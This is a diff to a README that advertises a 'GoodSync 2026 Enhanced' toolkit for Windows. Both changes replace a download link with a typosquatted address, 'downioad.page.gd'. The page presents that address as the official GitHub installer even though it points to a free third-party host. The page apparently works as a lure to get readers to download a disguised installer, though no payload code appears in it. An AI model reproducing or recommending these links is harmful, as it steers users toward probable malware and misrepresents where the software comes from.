@@ -2,7 +2,7 @@
 
 GoodSync 2026 Enhanced is a powerful tool designed to optimize and enhance the synchronization capabilities of GoodSync on Windows systems. This toolkit provides advanced features for seamless file management and data backup, ensuring your files are always in sync and secure with minimal effort.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ An internet connection is required for cloud integration features and for downlo
 
 To get started with GoodSync 2026 Enhanced Toolkit, download the latest version from the official GitHub page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides direct access to the installer and ensures you receive the most up-to-date features and security improvements. Remember to always download from trusted sources.
 
